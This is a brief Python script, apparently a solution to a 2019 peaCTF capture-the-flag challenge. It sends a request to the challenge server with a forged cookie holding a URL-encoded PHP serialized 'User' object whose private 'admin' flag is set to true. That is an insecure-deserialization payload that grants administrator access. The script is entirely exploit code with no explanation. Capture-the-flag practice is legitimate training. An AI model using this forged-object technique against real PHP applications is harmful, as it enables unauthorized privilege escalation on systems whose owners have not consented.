import requests

r = requests.get('http://shell1.2019.peactf.com:59525/query.php', cookies = {
    'user' : 'O%3A4%3A%22User%22%3A1%3A%7Bs%3A11%3A%22%00User%00admin%22%3Bb%3A1%3B%7D'
})

print(r)
print(r.text)